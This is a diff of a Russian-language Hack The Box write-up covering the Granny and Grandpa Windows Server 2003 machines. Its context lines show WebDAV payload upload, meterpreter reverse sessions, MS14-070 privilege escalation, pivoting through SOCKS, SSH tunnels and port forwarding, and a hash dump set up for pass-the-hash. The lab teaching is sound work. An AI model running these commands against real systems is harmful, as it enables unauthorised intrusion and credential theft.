@@ -4,18 +4,18 @@ title: "HTB{ Granny💔Grandpa }"
 date: 2020-01-26 22:00:00 +0300
 author: snovvcrash
 categories: /pentest
-tags: [hackthebox, xakepru, windows, webdav, davtest, burp, msfvenom, metasploit, upload-asp, cve-2017-7269, scstoragepathfromurl, ms14-070, tcpip-ioctl, pivoting, msf-route, msf-socks, proxychains-ng, ssh-reverse-tcp, plink.exe, msf-portfwd, msf-hashdump, lmhash-nthash, pass-the-hash, impacket, psexec.py]
+tags: [write-up, hackthebox, windows, webdav, davtest, burp, msfvenom, metasploit, upload-asp, cve-2017-7269, scstoragepathfromurl, ms14-070, tcpip-ioctl, pivoting, msf-route, msf-socks, proxychains-ng, ssh-reverse-tcp, plink.exe, msf-portfwd, msf-hashdump, lmhash-nthash, pass-the-hash, impacket, psexec.py]
 comments: true
 published: true
 ---
 
 [//]: # (2019-12-26)
 
-[![xakep-badge.svg](https://img.shields.io/badge/%5d%5b-xakep.ru-red?style=flat-square)](https://xakep.ru/2019/12/26/htb-pivoting/ "Большой проброс. Оттачиваем искусство pivoting на виртуалках с Hack The Box — «Хакер»")
-
 На заре становления Hack The Box как онлайн-площадки для тренировки вайтхетов в списке машин ее лаборатории значились две виртуалки: **Grandpa** и **Granny**. Обе эти машины нацелены на эксплуатацию уязвимостей WebDAV (набора дополнений для HTTP), и стратегии захвата их root-флагов практически не отличаются друг от друга. Поэтому, чтобы разнообразить прохождения, мы сначала быстро рассмотрим, как можно взломать каждый из хостов по отдельности, а после этого превратим один из них в шлюз, через который атакуем второй хост. Умение пользоваться техникой Pivoting — проброса трафика к жертве (и обратно) через промежуточные хосты — жизненно важный скил для этичного хакера, который пригодится при тестировании на проникновение любой корпоративной сетки.
 
 <!--cut-->
+
+[![xakep-badge.svg](https://img.shields.io/badge/%5d%5b-xakep.ru-red?style=flat-square)](https://xakep.ru/2019/12/26/htb-pivoting/ "Большой проброс. Оттачиваем искусство pivoting на виртуалках с Hack The Box — «Хакер»")
 
 * TOC
 {:toc}
@@ -29,10 +29,10 @@ published: true
 **3.4/10**
 {: style="color: green; text-align: right;"}
 
-[![granny-banner.png]({{ "/img/htb/boxes/grandparents/granny-banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/14 "Hack The Box :: Granny")
+[![granny-banner.png]({{ "/assets/images/htb/grandparents/granny-banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/14 "Hack The Box :: Granny")
 {: .center-image}
 
-![granny-info.png]({{ "/img/htb/boxes/grandparents/granny-info.png" | relative_url }})
+![granny-info.png]({{ "/assets/images/htb/grandparents/granny-info.png" | relative_url }})
 {: .center-image}
 
 ## Разведка
@@ -78,7 +78,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Итак, что у нас есть? Веб-сервер Microsoft IIS, версия 6.0. Если спросить Google, что он знает об этой ревизии IIS, то он сдаст «мелкомягких» с потрохами: Windows Server 2003.
 
-[![google-iis-version.png]({{ "/img/htb/boxes/grandparents/google-iis-version.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/google-iis-version.png" | relative_url }})
+[![google-iis-version.png]({{ "/assets/images/htb/grandparents/google-iis-version.png" | relative_url }})]({{ "/assets/images/htb/grandparents/google-iis-version.png" | relative_url }})
 {: .center-image}
 
 Информации об архитектуре Windows у нас нет, поэтому пока будем считать, что это x86, ибо они были более распространены в свое время. Также скрипт `http-webdav-scan.nse` оповестил нас об установленном наборе HTTP-расширений [WebDAV](https://xakep.ru/2014/09/09/webdav/). В общем, все намекает на то, что нам суждено отправиться на исследование веба.
@@ -93,7 +93,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 На главной странице веб-сервера (`http://10.10.10.15/`) — заглушка.
 
-[![web-granny-main-page.png]({{ "/img/htb/boxes/grandparents/web-granny-main-page.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/web-granny-main-page.png" | relative_url }})
+[![web-granny-main-page.png]({{ "/assets/images/htb/grandparents/web-granny-main-page.png" | relative_url }})]({{ "/assets/images/htb/grandparents/web-granny-main-page.png" | relative_url }})
 {: .center-image}
 
 Браузер оказался немногословен, поэтому постараемся расширить список наших знаний о системе заголовками HTTP-хедеров.
@@ -130,7 +130,7 @@ Date: Sat, 21 Dec 2019 21:51:01 GMT
 
 Сначала исследуем состояние безопасности с помощью `davtest`. К сожалению, эта утилита не позволяет указать прокси-сервер, чтобы посмотреть, какие именно запросы были отправлены, поэтому мы пойдем на хитрость: запустим Burp Suite, перейдем на вкладку Proxy → Options и добавим еще один листенер `10.10.10.15:80` на интерфейс loopback.
 
-[![burp-proxy-settings.png]({{ "/img/htb/boxes/grandparents/burp-proxy-settings.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/burp-proxy-settings.png" | relative_url }})
+[![burp-proxy-settings.png]({{ "/assets/images/htb/grandparents/burp-proxy-settings.png" | relative_url }})]({{ "/assets/images/htb/grandparents/burp-proxy-settings.png" | relative_url }})
 {: .center-image}
 
 Теперь я могу натравить `davtest` на localhost точно так же, как на `10.10.10.15`, и все запросы полетят через проксю Burp.
@@ -164,7 +164,7 @@ PUT     jsp     FAIL
 
 Несмотря на то, что по мнению `davtest` все попытки загрузить какой-либо файл на сервер провалились, мы можем открыть историю Burp и посмотреть, что же на самом деле произошло.
 
-[![burp-http-history.png]({{ "/img/htb/boxes/grandparents/burp-http-history.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/burp-http-history.png" | relative_url }})
+[![burp-http-history.png]({{ "/assets/images/htb/grandparents/burp-http-history.png" | relative_url }})]({{ "/assets/images/htb/grandparents/burp-http-history.png" | relative_url }})
 {: .center-image}
 
 Как видно из скриншота, разные запросы `PUT` получили разные ответы веб-сервера:
@@ -201,10 +201,10 @@ Content-Length: 0
 
 Как нетрудно догадаться, проблема заключается в попытке создать вложенный каталог `/DavTestDir_evilhacker` внутри несуществущего родителя `/localhost`. Не знаю, умеет ли так делать WebDAV в принципе (спецификацию было смотреть лень, может в комменатриях подскажут), но если попробовать создать одноуровневую директорию `/localhost`, она успешно появится, и все встанет на свои места.
 
-[![burp-mkcol.png]({{ "/img/htb/boxes/grandparents/burp-mkcol.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/burp-mkcol.png" | relative_url }})
+[![burp-mkcol.png]({{ "/assets/images/htb/grandparents/burp-mkcol.png" | relative_url }})]({{ "/assets/images/htb/grandparents/burp-mkcol.png" | relative_url }})
 {: .center-image}
 
-[![burp-put.png]({{ "/img/htb/boxes/grandparents/burp-put.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/burp-put.png" | relative_url }})
+[![burp-put.png]({{ "/assets/images/htb/grandparents/burp-put.png" | relative_url }})]({{ "/assets/images/htb/grandparents/burp-put.png" | relative_url }})
 {: .center-image}
 
 После этого текстовый файл успешно загрузился, а это означает, что наш план в силе, и можно приступать к генерации полезной нагрузки.
@@ -252,7 +252,7 @@ dav:/> put m.txt
 dav:/> move m.txt m.aspx
 ```
 
-[![cadaver.png]({{ "/img/htb/boxes/grandparents/cadaver.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/cadaver.png" | relative_url }})
+[![cadaver.png]({{ "/assets/images/htb/grandparents/cadaver.png" | relative_url }})]({{ "/assets/images/htb/grandparents/cadaver.png" | relative_url }})
 {: .center-image}
 
 Теперь можно поднимать слушателя Metasploit и запускать сам файл `m.aspx` на сервере (просто обратиться к нему из браузера).
@@ -261,7 +261,7 @@ dav:/> move m.txt m.aspx
 root@kali:~# msfconsole -qr meterpreter/l.rc
 ```
 
-[![msf-granny-launch-listener.png]({{ "/img/htb/boxes/grandparents/msf-granny-launch-listener.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/msf-granny-launch-listener.png" | relative_url }})
+[![msf-granny-launch-listener.png]({{ "/assets/images/htb/grandparents/msf-granny-launch-listener.png" | relative_url }})]({{ "/assets/images/htb/grandparents/msf-granny-launch-listener.png" | relative_url }})
 {: .center-image}
 
 И вот у нас уже есть сессия meterpreter от имени NT AUTHORITY\NETWORK SERVICE.
@@ -272,12 +272,12 @@ root@kali:~# msfconsole -qr meterpreter/l.rc
 
 Далее дело техники: запустим советчик по локальным уязвимостям и выберем наугад первый попавшийся эксплоит — благо, тачка старая и выбор велик.
 
-[![msf-granny-exploit-suggester.png]({{ "/img/htb/boxes/grandparents/msf-granny-exploit-suggester.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/msf-granny-exploit-suggester.png" | relative_url }})
+[![msf-granny-exploit-suggester.png]({{ "/assets/images/htb/grandparents/msf-granny-exploit-suggester.png" | relative_url }})]({{ "/assets/images/htb/grandparents/msf-granny-exploit-suggester.png" | relative_url }})
 {: .center-image}
 
 После минутного ожидания 29 уязвимостей были проверены, и 7 из них подошли с высокой вероятностью.
 
-[![msf-granny-privesc.png]({{ "/img/htb/boxes/grandparents/msf-granny-privesc.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/msf-granny-privesc.png" | relative_url }})
+[![msf-granny-privesc.png]({{ "/assets/images/htb/grandparents/msf-granny-privesc.png" | relative_url }})]({{ "/assets/images/htb/grandparents/msf-granny-privesc.png" | relative_url }})
 {: .center-image}
 
 Я выбрал [MS14-070](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-070) — уязвимость виндового стека TCP/IP. Повышение привилегий с помощью Metasploit заняло считанные секунды, и я получил привилегированный шелл.
@@ -286,22 +286,22 @@ root@kali:~# msfconsole -qr meterpreter/l.rc
 
 Если заспавнить шелл и спросить `whoami`, сервер ответит, что ты все еще обладаешь правами не выше NETWORK SERVICE. Происходит это из-за того, что пейлоад meterpreter все еще инжектирован в первый процесс, который мы заарканили до повышения привилегий. Для того, чтобы получить права SYSTEM из оболочки cmd, достаточно мигрировать вредоносный процесс в процесс с соответствующими привилегиями.
 
-[![msf-granny-shell-whoami-fail.png]({{ "/img/htb/boxes/grandparents/msf-granny-shell-whoami-fail.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/msf-granny-shell-whoami-fail.png" | relative_url }})
+[![msf-granny-shell-whoami-fail.png]({{ "/assets/images/htb/grandparents/msf-granny-shell-whoami-fail.png" | relative_url }})]({{ "/assets/images/htb/grandparents/msf-granny-shell-whoami-fail.png" | relative_url }})
 {: .center-image}
 
 Я выбрал `cidaemon.exe` с PID `3964` в качестве носителя и подселился к нему.
 
-[![msf-granny-migrate.png]({{ "/img/htb/boxes/grandparents/msf-granny-migrate.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/msf-granny-migrate.png" | relative_url }})
+[![msf-granny-migrate.png]({{ "/assets/images/htb/grandparents/msf-granny-migrate.png" | relative_url }})]({{ "/assets/images/htb/grandparents/msf-granny-migrate.png" | relative_url }})
 {: .center-image}
 
 Теперь права отображаются корректно.
 
-[![msf-granny-shell-whoami-success.png]({{ "/img/htb/boxes/grandparents/msf-granny-shell-whoami-success.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/msf-granny-shell-whoami-success.png" | relative_url }})
+[![msf-granny-shell-whoami-success.png]({{ "/assets/images/htb/grandparents/msf-granny-shell-whoami-success.png" | relative_url }})]({{ "/assets/images/htb/grandparents/msf-granny-shell-whoami-success.png" | relative_url }})
 {: .center-image}
 
 Дело за малым: найти и вытащить хеши (флаги) юзера и администратора. Сделаю я это с помощью meterpreter — а именно модулей `search` и `download`.
 
-[![msf-granny-get-hashes.png]({{ "/img/htb/boxes/grandparents/msf-granny-get-hashes.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/msf-granny-get-hashes.png" | relative_url }})
+[![msf-granny-get-hashes.png]({{ "/assets/images/htb/grandparents/msf-granny-get-hashes.png" | relative_url }})]({{ "/assets/images/htb/grandparents/msf-granny-get-hashes.png" | relative_url }})
 {: .center-image}
 
 Напоследок, посмотрим на разрядность ОС.
@@ -321,7 +321,7 @@ Meterpreter     : x86/windows
 
 На этом виртуалку Granny считаю пройденной.
 
-![granny-trophy.png]({{ "/img/htb/boxes/grandparents/granny-trophy.png" | relative_url }})
+![granny-trophy.png]({{ "/assets/images/htb/grandparents/granny-trophy.png" | relative_url }})
 {: .center-image}
 
 Переходим к Grandpa.
@@ -333,10 +333,10 @@ Meterpreter     : x86/windows
 **4.5/10**
 {: style="color: green; text-align: right;"}
 
-[![grandpa-banner.png]({{ "/img/htb/boxes/grandparents/grandpa-banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/13 "Hack The Box :: Grandpa")
+[![grandpa-banner.png]({{ "/assets/images/htb/grandparents/grandpa-banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/13 "Hack The Box :: Grandpa")
 {: .center-image}
 
-![grandpa-info.png]({{ "/img/htb/boxes/grandparents/grandpa-info.png" | relative_url }})
+![grandpa-info.png]({{ "/assets/images/htb/grandparents/grandpa-info.png" | relative_url }})
 {: .center-image}
 
 ## Разведка
@@ -382,7 +382,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 На главной веб-сайта висит такая же заглушка.
 
-[![web-grandpa-main-page.png]({{ "/img/htb/boxes/grandparents/web-grandpa-main-page.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/web-grandpa-main-page.png" | relative_url }})
+[![web-grandpa-main-page.png]({{ "/assets/images/htb/grandparents/web-grandpa-main-page.png" | relative_url }})]({{ "/assets/images/htb/grandparents/web-grandpa-main-page.png" | relative_url }})
 {: .center-image}
 
 ### WebDAV
@@ -391,14 +391,14 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Оригинальный PoC [доступен](https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py) на GitHub, однако я пользовался встроенным модулем Metasploit — `iis_webdav_scstoragepathfromurl`.
 
-[![msf-grandpa-scstoragepathfromurl.png]({{ "/img/htb/boxes/grandparents/msf-grandpa-scstoragepathfromurl.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/msf-grandpa-scstoragepathfromurl.png" | relative_url }})
+[![msf-grandpa-scstoragepathfromurl.png]({{ "/assets/images/htb/grandparents/msf-grandpa-scstoragepathfromurl.png" | relative_url }})]({{ "/assets/images/htb/grandparents/msf-grandpa-scstoragepathfromurl.png" | relative_url }})
 {: .center-image}
 
 После получения сессии meterpreter ты можешь столкнуться с ошибкой прав доступа. Причины возникновения этого бага схожи с теми, что мы наблюдали в аналогичной ситуации при прохождении Granny: пейлоду тесно в процессе, в котором он сидит.
 
 Чтобы выйти из этого положения, я снова вызову Process List и мигрирую в тот процесс, который обладает нужными мне полномочиями.
 
-[![msf-grandpa-migrate.png]({{ "/img/htb/boxes/grandparents/msf-grandpa-migrate.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/msf-grandpa-migrate.png" | relative_url }})
+[![msf-grandpa-migrate.png]({{ "/assets/images/htb/grandparents/msf-grandpa-migrate.png" | relative_url }})]({{ "/assets/images/htb/grandparents/msf-grandpa-migrate.png" | relative_url }})
 {: .center-image}
 
 Кстати, для того, чтобы узнать, в какой процесс был проведен первичный инжект, можно воспользоваться командой `netstat` до миграции и посмотреть список активных сетевых соединений.
@@ -407,29 +407,29 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 C:\windows\system32\inetsrv>netstat -vb
 ```
 
-[![msf-grandpa-shell-netstat.png]({{ "/img/htb/boxes/grandparents/msf-grandpa-shell-netstat.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/msf-grandpa-shell-netstat.png" | relative_url }})
+[![msf-grandpa-shell-netstat.png]({{ "/assets/images/htb/grandparents/msf-grandpa-shell-netstat.png" | relative_url }})]({{ "/assets/images/htb/grandparents/msf-grandpa-shell-netstat.png" | relative_url }})
 {: .center-image}
 
 ### Эскалация привилегий
 
 Здесь все идентично предыдущей тачки: для повышение привилегий я буду использовать тот же сплоит.
 
-[![msf-grandpa-exploit-suggester.png]({{ "/img/htb/boxes/grandparents/msf-grandpa-exploit-suggester.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/msf-grandpa-exploit-suggester.png" | relative_url }})
+[![msf-grandpa-exploit-suggester.png]({{ "/assets/images/htb/grandparents/msf-grandpa-exploit-suggester.png" | relative_url }})]({{ "/assets/images/htb/grandparents/msf-grandpa-exploit-suggester.png" | relative_url }})
 {: .center-image}
 
 Для порядка я запустил поиск локальных уязвимостей, и список оказался точно таким же как и у виртуалки Granny.
 
-[![msf-grandpa-privesc.png]({{ "/img/htb/boxes/grandparents/msf-grandpa-privesc.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/msf-grandpa-privesc.png" | relative_url }})
+[![msf-grandpa-privesc.png]({{ "/assets/images/htb/grandparents/msf-grandpa-privesc.png" | relative_url }})]({{ "/assets/images/htb/grandparents/msf-grandpa-privesc.png" | relative_url }})
 {: .center-image}
 
 Выбрали `ms14_070_tcpip_ioctl`, повысили привилегии и получили свою сессию.
 
-[![msf-grandpa-get-hashes.png]({{ "/img/htb/boxes/grandparents/msf-grandpa-get-hashes.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/msf-grandpa-get-hashes.png" | relative_url }})
+[![msf-grandpa-get-hashes.png]({{ "/assets/images/htb/grandparents/msf-grandpa-get-hashes.png" | relative_url }})]({{ "/assets/images/htb/grandparents/msf-grandpa-get-hashes.png" | relative_url }})
 {: .center-image}
 
 Забираем награду, и Grandpa пройден!
 
-![grandpa-trophy.png]({{ "/img/htb/boxes/grandparents/grandpa-trophy.png" | relative_url }})
+![grandpa-trophy.png]({{ "/assets/images/htb/grandparents/grandpa-trophy.png" | relative_url }})
 {: .center-image}
 
 # Pivoting
@@ -458,17 +458,17 @@ root@kali:~# iptables -A OUTPUT -d 10.10.10.14 -j DROP
 root@kali:~# iptables -A INPUT -s 10.10.10.14 -j DROP
 ```
 
-[![iptables-drop-grandpa-out.gif]({{ "/img/htb/boxes/grandparents/iptables-drop-grandpa-out.gif" | relative_url }})]({{ "/img/htb/boxes/grandparents/iptables-drop-grandpa-out.gif" | relative_url }})
+[![iptables-drop-grandpa-out.gif]({{ "/assets/images/htb/grandparents/iptables-drop-grandpa-out.gif" | relative_url }})]({{ "/assets/images/htb/grandparents/iptables-drop-grandpa-out.gif" | relative_url }})
 {: .center-image}
 
 Упрощенно схему подключения к скрытому за VPN сегменту (виртуальной) сети лаборатории Hack The Box можно изобразить так.
 
-[![network-htb.png]({{ "/img/htb/boxes/grandparents/network-htb.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/network-htb.png" | relative_url }})
+[![network-htb.png]({{ "/assets/images/htb/grandparents/network-htb.png" | relative_url }})]({{ "/assets/images/htb/grandparents/network-htb.png" | relative_url }})
 {: .center-image}
 
 Однако в рамках нашей задачи лучше абстрагироваться и представить схему взаимодействия «Атакующий-Pivot-Grandpa» в следующем виде.
 
-[![network-pivot-basic.png]({{ "/img/htb/boxes/grandparents/network-pivot-basic.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/network-pivot-basic.png" | relative_url }})
+[![network-pivot-basic.png]({{ "/assets/images/htb/grandparents/network-pivot-basic.png" | relative_url }})]({{ "/assets/images/htb/grandparents/network-pivot-basic.png" | relative_url }})
 {: .center-image}
 
 Слева — атакующий (ВМ Kali), посередине — ВМ Granny, справа — жертва (ВМ Grandpa). «Общение» напрямую между атакующим и жертвой исключено. Единственный способ взаимодействия — посредством промежуточного хоста.
@@ -501,7 +501,7 @@ back
 root@kali:~# msfconsole -qr pivot.rc
 ```
 
-[![msf-pivot-granny-iis-webdav-upload-asp.png]({{ "/img/htb/boxes/grandparents/msf-pivot-granny-iis-webdav-upload-asp.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/msf-pivot-granny-iis-webdav-upload-asp.png" | relative_url }})
+[![msf-pivot-granny-iis-webdav-upload-asp.png]({{ "/assets/images/htb/grandparents/msf-pivot-granny-iis-webdav-upload-asp.png" | relative_url }})]({{ "/assets/images/htb/grandparents/msf-pivot-granny-iis-webdav-upload-asp.png" | relative_url }})
 {: .center-image}
 
 После этого с помощью команды `route add` я добавляю правило маршрутизации для открытой сессии meterpreter (сессия 1).
@@ -520,7 +520,7 @@ msf5 > jobs
 msf5 > route
 ```
 
-[![msf-jobs-route.png]({{ "/img/htb/boxes/grandparents/msf-jobs-route.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/msf-jobs-route.png" | relative_url }})
+[![msf-jobs-route.png]({{ "/assets/images/htb/grandparents/msf-jobs-route.png" | relative_url }})]({{ "/assets/images/htb/grandparents/msf-jobs-route.png" | relative_url }})
 {: .center-image}
 
 Первая команда покажет все процессы, которые запущены на фоне Metasploit (видим наш SOCKS-сервер), а вторая выведет список активных правил маршрутизации.
@@ -538,7 +538,7 @@ root@kali:~# apt install proxychains4
 root@kali:~# proxychains4 nmap -n -v -Pn -sT 10.10.10.14 -p80
 ```
 
-[![nmap-grandpa-proxychains-web.png]({{ "/img/htb/boxes/grandparents/nmap-grandpa-proxychains-web.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/nmap-grandpa-proxychains-web.png" | relative_url }})
+[![nmap-grandpa-proxychains-web.png]({{ "/assets/images/htb/grandparents/nmap-grandpa-proxychains-web.png" | relative_url }})]({{ "/assets/images/htb/grandparents/nmap-grandpa-proxychains-web.png" | relative_url }})
 {: .center-image}
 
 Можно убедиться, что 80-й порт на хосте Grandpa открыт.
@@ -549,7 +549,7 @@ root@kali:~# proxychains4 nmap -n -v -Pn -sT 10.10.10.14 -p80
 
 На этом этапе нашу воображаемую схему можно дополнить пометками об использовании SOCKS-сервера и маршрутов Metasploit.
 
-[![network-pivot-route-and-socks.png]({{ "/img/htb/boxes/grandparents/network-pivot-route-and-socks.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/network-pivot-route-and-socks.png" | relative_url }})
+[![network-pivot-route-and-socks.png]({{ "/assets/images/htb/grandparents/network-pivot-route-and-socks.png" | relative_url }})]({{ "/assets/images/htb/grandparents/network-pivot-route-and-socks.png" | relative_url }})
 {: .center-image}
 
 ## Реверсивный SSH-туннель
@@ -566,7 +566,7 @@ root@kali:~# proxychains4 nmap -n -v -Pn -sT 10.10.10.14 -p80
 
 Чтобы пробросить SSH-туннель c Granny до Kali, сперва придется отключить файрвол на Windows Server. Сделать это можно только с привилегиями админа, поэтому мне пришлось снова воспользоваться MS14-070.
 
-[![msf-pivot-granny-privesc.png]({{ "/img/htb/boxes/grandparents/msf-pivot-granny-privesc.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/msf-pivot-granny-privesc.png" | relative_url }})
+[![msf-pivot-granny-privesc.png]({{ "/assets/images/htb/grandparents/msf-pivot-granny-privesc.png" | relative_url }})]({{ "/assets/images/htb/grandparents/msf-pivot-granny-privesc.png" | relative_url }})
 {: .center-image}
 
 Теперь можно спавнить шелл и делать все, что душе угодно.
@@ -607,7 +607,7 @@ root@kali:~# service ssh start
 
 Еще я лишу этого пользователя возможности выполнять команды, изменив дефолтный шелл на `/bin/false` в файле `/etc/passwd`. Выполнять команды ему не за чем, а вот безопасность схемы от этого только повысится.
 
-[![etc-passwd-edit.png]({{ "/img/htb/boxes/grandparents/etc-passwd-edit.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/etc-passwd-edit.png" | relative_url }})
+[![etc-passwd-edit.png]({{ "/assets/images/htb/grandparents/etc-passwd-edit.png" | relative_url }})]({{ "/assets/images/htb/grandparents/etc-passwd-edit.png" | relative_url }})
 {: .center-image}
 
 Теперь все готово и можно прокладывать SSH-туннель. Из командной строки Windows я выполню такую команду.
@@ -616,19 +616,19 @@ root@kali:~# service ssh start
 C:\Inetpub\wwwroot>plink.exe -l snovvcrash -pw qwe123 -L 10.10.10.15:8888:10.10.14.30:8888 -N 10.10.14.30
 ```
 
-[![ssh-tunnel-create.png]({{ "/img/htb/boxes/grandparents/ssh-tunnel-create.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/ssh-tunnel-create.png" | relative_url }})
+[![ssh-tunnel-create.png]({{ "/assets/images/htb/grandparents/ssh-tunnel-create.png" | relative_url }})]({{ "/assets/images/htb/grandparents/ssh-tunnel-create.png" | relative_url }})
 {: .center-image}
 
 Это означает примерно следующее: «Granny, перенаправляй, пожалуйста, все, что поступит в порт `8888` интерфейса `10.10.10.15` по адресу `10.10.14.30:8888` через SSH-туннель». Проверить работоспособность можно с помощью обычного `nc`.
 
-[![ssh-tunnel-check.png]({{ "/img/htb/boxes/grandparents/ssh-tunnel-check.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/ssh-tunnel-check.png" | relative_url }})
+[![ssh-tunnel-check.png]({{ "/assets/images/htb/grandparents/ssh-tunnel-check.png" | relative_url }})]({{ "/assets/images/htb/grandparents/ssh-tunnel-check.png" | relative_url }})
 {: .center-image}
 
 Обращаю внимание, чтобы не возникло путаницы: туннель был создан с опцией `-L` с хоста Granny, поэтому по отношению к машине атакующего он является «прямым». Если же посмотреть на эту схему со стороны Kali, то туннель логичнее называть «реверсивным».
 
 Теперь наша схема выглядит так.
 
-[![network-pivot-ssh-tunnel.png]({{ "/img/htb/boxes/grandparents/network-pivot-ssh-tunnel.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/network-pivot-ssh-tunnel.png" | relative_url }})
+[![network-pivot-ssh-tunnel.png]({{ "/assets/images/htb/grandparents/network-pivot-ssh-tunnel.png" | relative_url }})]({{ "/assets/images/htb/grandparents/network-pivot-ssh-tunnel.png" | relative_url }})
 {: .center-image}
 
 ### Hack Grandpa!
@@ -637,12 +637,12 @@ C:\Inetpub\wwwroot>plink.exe -l snovvcrash -pw qwe123 -L 10.10.10.15:8888:10.10.
 
 Для этого я опять выберу эксплоит `iis_webdav_scstoragepathfromurl`, но в этот раз его настройка будет немного отличаться: на роль машины атакующего (`LHOST`) я назначу хост Granny (`10.10.10.15`), а в роли порта для привязки хендлера (`LPORT`) выступит порт `8888` (через который все будет отправляться на Kali по SSH-туннелю).
 
-[![msf-pivot-grandpa-scstoragepathfromurl.png]({{ "/img/htb/boxes/grandparents/msf-pivot-grandpa-scstoragepathfromurl.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/msf-pivot-grandpa-scstoragepathfromurl.png" | relative_url }})
+[![msf-pivot-grandpa-scstoragepathfromurl.png]({{ "/assets/images/htb/grandparents/msf-pivot-grandpa-scstoragepathfromurl.png" | relative_url }})]({{ "/assets/images/htb/grandparents/msf-pivot-grandpa-scstoragepathfromurl.png" | relative_url }})
 {: .center-image}
 
 После проведения эксплуатации я повышу привилегии с помощью не подводившего еще нас MS14-070.
 
-[![msf-pivot-grandpa-privesc.png]({{ "/img/htb/boxes/grandparents/msf-pivot-grandpa-privesc.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/msf-pivot-grandpa-privesc.png" | relative_url }})
+[![msf-pivot-grandpa-privesc.png]({{ "/assets/images/htb/grandparents/msf-pivot-grandpa-privesc.png" | relative_url }})]({{ "/assets/images/htb/grandparents/msf-pivot-grandpa-privesc.png" | relative_url }})
 {: .center-image}
 
 После всех манипуляций можно открыть сессию meterpreter и посмотреть информацию о системе.
@@ -673,19 +673,19 @@ meterpreter > portfwd add -l 445 -p 445 -r 127.0.0.1
 
 Этой командой я говорю, что локальный порт `445` (флаг `-l`) машины атакующего должен ассоциироваться с открытой сессией meterpreter, а все, что в него попадает, должно быть передано на удаленный порт `445` (флаг `-p`) машины-жертвы (флаг `-r`) по интерфейсу `127.0.0.1` (так как SMB доступен локально на Windows Server). Если повторно запустить Nmap и просканировать 445-й порт (заметь, уже на локалхосте) — о, чудо, он окажется открытым!
 
-[![nmap-grandpa-smb.png]({{ "/img/htb/boxes/grandparents/nmap-grandpa-smb.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/nmap-grandpa-smb.png" | relative_url }})
+[![nmap-grandpa-smb.png]({{ "/assets/images/htb/grandparents/nmap-grandpa-smb.png" | relative_url }})]({{ "/assets/images/htb/grandparents/nmap-grandpa-smb.png" | relative_url }})
 {: .center-image}
 
 То есть поверх уже настроенного в Metasploit маршрута мы пробросили порт `445` с машины атакующего до порта `445` на ВМ Grandpa, который прежде был доступен только на loopback-интерфейсе из-за правил файрвола. В честь этого завершим обновление нашей схемы взаимодействия, добавив на нее проброс 445-го порта.
 
-[![network-pivot-portfwd.png]({{ "/img/htb/boxes/grandparents/network-pivot-portfwd.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/network-pivot-portfwd.png" | relative_url }})
+[![network-pivot-portfwd.png]({{ "/assets/images/htb/grandparents/network-pivot-portfwd.png" | relative_url }})]({{ "/assets/images/htb/grandparents/network-pivot-portfwd.png" | relative_url }})
 {: .center-image}
 
 ### Pass-the-Hash
 
 Так как это Windows Server 2003, тебе не составит большого труда вскрыть шару SMB, ведь здесь все еще актуальны LM-хеши для хранения паролей. А они ломаются на раз. Однако я пойду по еще более простому пути.
 
-[![msf-pivot-grandpa-hashdump.png]({{ "/img/htb/boxes/grandparents/msf-pivot-grandpa-hashdump.png" | relative_url }})]({{ "/img/htb/boxes/grandparents/msf-pivot-grandpa-hashdump.png" | relative_url }})
+[![msf-pivot-grandpa-hashdump.png]({{ "/assets/images/htb/grandparents/msf-pivot-grandpa-hashdump.png" | relative_url }})]({{ "/assets/images/htb/grandparents/msf-pivot-grandpa-hashdump.png" | relative_url }})
 {: .center-image}
 
 Благодаря `hashdump` я могу сдампить пару хешей `LMHASH:NTHASH` из базы данных SAM и провести атаку Pass-the-Hash с помощью внешней утилиты `psexec.py`, входящей в состав тулкита [Impacket](https://github.com/SecureAuthCorp/impacket).
